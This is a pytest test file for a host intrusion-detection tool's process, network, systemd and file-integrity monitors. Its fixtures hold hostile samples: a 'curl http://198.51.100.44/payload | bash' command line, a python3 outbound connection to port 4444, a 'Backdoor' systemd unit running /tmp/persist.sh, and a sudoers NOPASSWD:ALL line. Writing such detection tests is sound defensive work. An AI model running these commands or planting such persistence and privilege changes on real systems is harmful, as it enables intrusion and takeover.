from core.monitor import ProcessMonitor, NetworkMonitor, SystemdServiceMonitor
from core.risk import WeightedRiskScorer, RiskSignal
import core.monitor as monitor_module


def test_routine_helper_processes_do_not_trigger_proc_011():
    monitor = ProcessMonitor()
    monitor._get_processes = lambda: {
        1: "systemd",
        2: "sshd",
    }
    assert monitor.check() == []

    monitor._get_processes = lambda: {
        1: "systemd",
        2: "sshd",
        10: "kworker/u8:1-events",
        11: "packagekitd",
        12: "apt-helper",
        13: "initramfs-tools",
    }
    alerts = monitor.check()
    assert [a.rule_id for a in alerts if a.rule_id == "PROC-011"] == []


def test_new_suspicious_process_still_triggers_proc_011():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 2,
        "parent_name": "sshd",
        "user": "alice",
        "cmdline": "/tmp/evil-loader --stage",
    }
    monitor._get_processes = lambda: {
        1: "systemd",
        2: "sshd",
    }
    assert monitor.check() == []

    monitor._get_processes = lambda: {
        1: "systemd",
        2: "sshd",
        20: "evil-loader",
    }
    alerts = monitor.check()
    hits = [a.rule_id for a in alerts]
    assert "PROC-011" in hits
    proc = next(a for a in alerts if a.rule_id == "PROC-011")
    assert proc.details["parent_name"] == "sshd"
    assert proc.details["user"] == "alice"
    assert proc.details["name_base"] == "evil-loader"


def test_benign_tracker_extract_local_context_is_suppressed():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 10,
        "parent_name": "tracker-miner-fs",
        "user": "alice",
        "exe": "/usr/libexec/tracker-extract",
        "cmdline": "/usr/libexec/tracker-extract /home/alice/Documents/test.txt",
        "cwd": "/home/alice",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "tracker-extract"}
    assert monitor.check() == []
    assert monitor.suppression_stats()["total"] == 1
    assert monitor.suppression_stats()["by_process"] == {"tracker-extract": 1}
    assert monitor.suppression_stats()["by_reason"] == {"benign_known_runtime_process": 1}



def test_benign_runc_expected_container_context_is_suppressed():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 30,
        "parent_name": "containerd-shim",
        "user": "root",
        "exe": "/usr/sbin/runc",
        "cmdline": "/usr/sbin/runc --root /run/containerd/runc/k8s.io",
        "cwd": "/run/containerd",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "runc"}
    assert monitor.check() == []
    assert monitor.suppression_stats()["by_process"]["runc"] == 1



def test_benign_udev_worker_local_context_is_suppressed():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 40,
        "parent_name": "systemd-udevd",
        "user": "root",
        "exe": "/usr/lib/systemd/systemd-udevd",
        "cmdline": "(udev-worker)",
        "cwd": "/",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "(udev-worker)"}
    assert monitor.check() == []
    assert monitor.suppression_stats()["by_process"]["udev-worker"] == 1



def test_benign_systemd_detect_virt_local_context_is_suppressed():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 50,
        "parent_name": "bash",
        "user": "alice",
        "exe": "/usr/bin/systemd-detect-virt",
        "cmdline": "/usr/bin/systemd-detect-virt --quiet",
        "cwd": "/home/alice",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "systemd-detect-virt"}
    assert monitor.check() == []
    assert monitor.suppression_stats()["by_process"]["systemd-detect-virt"] == 1



def test_proc011_context_aware_cooldown_suppresses_same_process_parent_user(monkeypatch):
    now = [1000.0]
    monkeypatch.setattr(monitor_module.time, "time", lambda: now[0])
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 60,
        "parent_name": "bash",
        "user": "alice",
        "exe": "/opt/acme/evil-loader",
        "cmdline": "/opt/acme/evil-loader --stage",
        "cwd": "/home/alice",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "evil-loader"}
    alerts = monitor.check()
    assert [a.rule_id for a in alerts] == ["PROC-011"]

    now[0] = 1020.0
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 21: "evil-loader"}
    assert monitor.check() == []



def test_allowlisted_process_with_tmp_path_still_triggers_proc011():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 10,
        "parent_name": "tracker-miner-fs",
        "user": "alice",
        "exe": "/tmp/tracker-extract",
        "cmdline": "/tmp/tracker-extract --stage",
        "cwd": "/tmp",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "tracker-extract"}
    alerts = monitor.check()
    assert [a.rule_id for a in alerts] == ["PROC-011"]
    assert alerts[0].details["path_class"] == "temp"



def test_allowlisted_process_with_web_parent_still_triggers_proc011():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 70,
        "parent_name": "apache2",
        "user": "www-data",
        "exe": "/usr/libexec/tracker-extract",
        "cmdline": "/usr/libexec/tracker-extract /var/www/html/upload.bin",
        "cwd": "/var/www/html",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "tracker-extract"}
    alerts = monitor.check()
    assert [a.rule_id for a in alerts] == ["PROC-011"]
    assert alerts[0].details["parent_name"] == "apache2"



def test_allowlisted_process_with_suspicious_curl_context_still_triggers_proc011():
    monitor = ProcessMonitor()
    monitor._read_process_context = lambda pid: {
        "pid": pid,
        "ppid": 80,
        "parent_name": "bash",
        "user": "alice",
        "exe": "/usr/libexec/tracker-extract",
        "cmdline": "/usr/libexec/tracker-extract curl http://198.51.100.44/payload | bash",
        "cwd": "/home/alice",
    }
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "tracker-extract"}
    alerts = monitor.check()
    assert [a.rule_id for a in alerts] == ["PROC-011"]
    assert alerts[0].details["classification"] == "unknown_process"
    assert alerts[0].details["reason"] == "first_seen_process"



def test_same_process_name_different_parent_keeps_visibility_within_cooldown(monkeypatch):
    now = [2000.0]
    monkeypatch.setattr(monitor_module.time, "time", lambda: now[0])
    monitor = ProcessMonitor()
    contexts = {
        20: {
            "pid": 20,
            "ppid": 90,
            "parent_name": "bash",
            "user": "alice",
            "exe": "/opt/acme/evil-loader",
            "cmdline": "/opt/acme/evil-loader --stage",
            "cwd": "/home/alice",
        },
        21: {
            "pid": 21,
            "ppid": 91,
            "parent_name": "apache2",
            "user": "www-data",
            "exe": "/opt/acme/evil-loader",
            "cmdline": "/opt/acme/evil-loader --stage web",
            "cwd": "/var/www/html",
        },
    }
    monitor._read_process_context = lambda pid: contexts[pid]
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 20: "evil-loader"}
    first = monitor.check()
    assert [a.rule_id for a in first] == ["PROC-011"]

    now[0] = 2020.0
    monitor._get_processes = lambda: {1: "systemd", 2: "sshd"}
    assert monitor.check() == []

    monitor._get_processes = lambda: {1: "systemd", 2: "sshd", 21: "evil-loader"}
    second = monitor.check()
    assert [a.rule_id for a in second] == ["PROC-011"]
    assert second[0].details["parent_name"] == "apache2"


def test_routine_browser_and_codex_external_connections_do_not_trigger_net_011():
    monitor = NetworkMonitor()
    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
    ]
    assert monitor.check() == []

    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
        {"local": "10.0.0.5:40001", "remote": "198.51.100.20:443", "proc": 'users:(("codex-cli",pid=2,fd=11))'},
    ]
    alerts = monitor.check()
    assert [a.rule_id for a in alerts if a.rule_id == "NET-011"] == []


def test_unknown_external_process_still_triggers_net_011():
    monitor = NetworkMonitor()
    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
    ]
    assert monitor.check() == []

    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
        {"local": "10.0.0.5:40002", "remote": "203.0.113.77:443", "proc": 'users:(("evil-loader",pid=3,fd=12))'},
    ]
    alerts = monitor.check()
    hits = [a.rule_id for a in alerts]
    assert "NET-011" in hits
    net = next(a for a in alerts if a.rule_id == "NET-011")
    assert net.details["remote_ip"] == "203.0.113.77"
    assert net.details["remote_port"] == 443
    assert net.details["socket_direction"] == "outbound"
    assert net.details["pid"] == 3


def test_network_monitor_enriches_shell_outbound_with_process_context(monkeypatch):
    monitor = NetworkMonitor()
    monkeypatch.setattr(
        ProcessMonitor,
        "_read_process_context",
        lambda self, pid: {
            "pid": pid,
            "user": "www-data",
            "exe": "/usr/bin/python3",
            "ppid": 200,
            "parent_name": "apache2",
            "cmdline": "python3 -c import socket",
        },
    )
    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
    ]
    assert monitor.check() == []

    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
        {"local": "10.0.0.5:40003", "remote": "198.51.100.44:4444", "proc": 'users:(("python3",pid=44,fd=12))'},
    ]
    alerts = monitor.check()
    hit = next(a for a in alerts if a.rule_id == "NET-010")
    assert hit.details["proc_user"] == "www-data"
    assert hit.details["proc_parent_name"] == "apache2"
    assert hit.details["remote_scope"] == "public"


def test_network_monitor_rare_destination_and_role_mismatch_alerts(monkeypatch):
    now = [1000.0]
    monkeypatch.setattr(monitor_module.time, "time", lambda: now[0])
    monkeypatch.setattr(
        ProcessMonitor,
        "_read_process_context",
        lambda self, pid: {
            "pid": pid,
            "user": "www-data",
            "exe": "/usr/sbin/nginx",
            "ppid": 1,
            "parent_name": "systemd",
            "cmdline": "nginx: worker process",
        },
    )
    monitor = NetworkMonitor()
    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
    ]
    assert monitor.check() == []

    now[0] = 1010.0
    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:40000", "remote": "93.184.216.34:443", "proc": 'users:(("chrome",pid=1,fd=10))'},
        {"local": "10.0.0.5:41000", "remote": "198.51.100.88:9001", "proc": 'users:(("nginx",pid=80,fd=11))'},
    ]
    alerts = monitor.check()
    hit = next(a for a in alerts if a.rule_id == "NET-014")
    assert hit.details["dest_novelty"] == "first_seen"
    assert hit.details["role_mismatch"] is True
    assert hit.details["behavior_actor"] == "www-data:nginx"


def test_network_monitor_fanout_burst_alerts(monkeypatch):
    now = [2000.0]
    monkeypatch.setattr(monitor_module.time, "time", lambda: now[0])
    monkeypatch.setattr(
        ProcessMonitor,
        "_read_process_context",
        lambda self, pid: {
            "pid": pid,
            "user": "alice",
            "exe": "/tmp/evil-loader",
            "ppid": 200,
            "parent_name": "sshd",
        },
    )
    monitor = NetworkMonitor()
    monitor._get_connections = lambda: []
    assert monitor.check() == []

    remotes = [
        "198.51.100.10:8081",
        "198.51.100.11:8082",
        "198.51.100.12:8083",
        "198.51.100.13:8084",
        "198.51.100.14:8085",
    ]
    for idx, remote in enumerate(remotes, start=1):
        now[0] = 2000.0 + idx
        monitor._get_connections = lambda remote=remote, idx=idx: [
            {"local": f"10.0.0.5:40{idx:03d}", "remote": remote, "proc": 'users:(("evil-loader",pid=66,fd=12))'},
        ]
        alerts = monitor.check()
    hit = next(a for a in alerts if a.rule_id == "NET-015")
    assert hit.details["fanout_unique_remotes"] >= 5


def test_network_monitor_reconnect_pattern_alerts(monkeypatch):
    now = [3000.0]
    monkeypatch.setattr(monitor_module.time, "time", lambda: now[0])
    monkeypatch.setattr(
        ProcessMonitor,
        "_read_process_context",
        lambda self, pid: {
            "pid": pid,
            "user": "alice",
            "exe": "/tmp/evil-loader",
            "ppid": 200,
            "parent_name": "bash",
        },
    )
    monitor = NetworkMonitor()
    monitor._get_connections = lambda: []
    assert monitor.check() == []

    for idx in range(4):
        now[0] = 3001.0 + idx
        monitor._get_connections = lambda idx=idx: [
            {"local": f"10.0.0.5:41{idx:03d}", "remote": "203.0.113.77:8444", "proc": 'users:(("evil-loader",pid=66,fd=12))'},
        ]
        alerts = monitor.check()
    hit = next(a for a in alerts if a.rule_id == "NET-016")
    assert hit.details["fanin_unique_local_ports"] >= 4


def test_network_monitor_long_lived_suspicious_outbound_alerts(monkeypatch):
    now = [4000.0]
    monkeypatch.setattr(monitor_module.time, "time", lambda: now[0])
    monkeypatch.setattr(
        ProcessMonitor,
        "_read_process_context",
        lambda self, pid: {
            "pid": pid,
            "user": "alice",
            "exe": "/tmp/evil-loader",
            "ppid": 200,
            "parent_name": "sshd",
        },
    )
    monitor = NetworkMonitor()
    monitor._get_connections = lambda: [
        {"local": "10.0.0.5:42000", "remote": "203.0.113.200:9001", "proc": 'users:(("evil-loader",pid=77,fd=12))'},
    ]
    assert monitor.check() == []

    now[0] = 4705.0
    alerts = monitor.check()
    hit = next(a for a in alerts if a.rule_id == "NET-017")
    assert hit.details["connection_age_seconds"] >= 600


def test_new_systemd_unit_creation_triggers_monitor_alert(tmp_path):
    monitor = SystemdServiceMonitor(state_dir=str(tmp_path), creation_only=True)
    base_unit = tmp_path / "sshd.service"
    base_unit.write_text("[Unit]\nDescription=SSH daemon\n")
    evil_unit = tmp_path / "evil-persist.service"
    evil_unit.write_text("[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/tmp/persist.sh\n")
    monitor._scan = lambda: {
        str(base_unit): 100.0,
    }
    assert monitor.check() == []

    monitor._scan = lambda: {
        str(base_unit): 100.0,
        str(evil_unit): 200.0,
    }
    alerts = monitor.check()
    assert [a.rule_id for a in alerts] == ["FIM-SYSTEMD-001"]
    assert alerts[0].details["unit"] == "evil-persist.service"
    assert "ExecStart=/tmp/persist.sh" in alerts[0].details["unit_preview"]
    assert alerts[0].details["path_owner"]


def test_fim_alert_includes_path_and_preview_context(tmp_path):
    from core.monitor import FileIntegrityMonitor

    target = tmp_path / "sudoers"
    target.write_text("Defaults env_reset\n")
    monitor = FileIntegrityMonitor(files=[str(target)], state_dir=str(tmp_path / "state"))

    assert monitor.check() == []

    target.write_text("Defaults env_reset\nalice ALL=(ALL) NOPASSWD:ALL\n")
    alerts = monitor.check()

    hit = next(a for a in alerts if a.rule_id == "FIM-001")
    assert hit.details["path_name"] == "sudoers"
    assert hit.details["path_parent"] == str(tmp_path)
    assert "NOPASSWD" in hit.details["content_preview"]


def test_modified_systemd_unit_is_suppressed_in_creation_only_mode(tmp_path):
    monitor = SystemdServiceMonitor(state_dir=str(tmp_path), creation_only=True)
    monitor._scan = lambda: {
        "/etc/systemd/system/sshd.service": 100.0,
    }
    assert monitor.check() == []

    monitor._scan = lambda: {
        "/etc/systemd/system/sshd.service": 200.0,
    }
    assert monitor.check() == []


def test_monitor_weight_stays_below_deterministic_high_confidence_sources():
    scorer = WeightedRiskScorer()
    monitor_total, monitor_breakdown = scorer.calculate([RiskSignal(source="monitor", score=90.0, ts=1.0)])
    rule_total, rule_breakdown = scorer.calculate([RiskSignal(source="rule_engine", score=90.0, ts=1.0)])
    ioc_total, ioc_breakdown = scorer.calculate([RiskSignal(source="ioc", score=90.0, ts=1.0)])

    assert monitor_breakdown["monitor"]["weight"] < rule_breakdown["rule_engine"]["weight"]
    assert monitor_breakdown["monitor"]["weight"] < ioc_breakdown["ioc"]["weight"]
    assert monitor_total == 90.0
    assert rule_total == 90.0
    assert ioc_total == 90.0
